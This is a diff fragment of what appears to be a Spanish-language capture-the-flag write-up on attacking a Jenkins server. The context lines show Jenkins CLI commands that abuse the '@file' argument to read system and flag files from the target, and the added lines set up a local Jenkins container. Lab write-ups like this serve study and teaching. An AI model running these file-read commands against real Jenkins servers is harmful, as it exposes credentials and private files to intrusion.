@@ -144,7 +144,19 @@ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/proc/net/fib_t
 java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/user.txt 2>&1 | grep -oP "'.*?'"
 ```
 
+- Ahora ejecutamos un contenedor docker de jenkins en nuestra terminal 
+```
+docker run -p 8080:8080 -p 50000:50000 --restart=on-failure -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts-jdk17
+```
+
+- Una vez iniciado el docker podemos ingresar al navegador por el localhost:8080 eh ingresar la constrase que indica en la instalación
+```
+688ddaf7d99c4c5381e15cdadf43a63d
+```
+- Iniciar con la instalación
+- Creamos el usuario y contraseña
 - 
+
 
 - Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
 ```
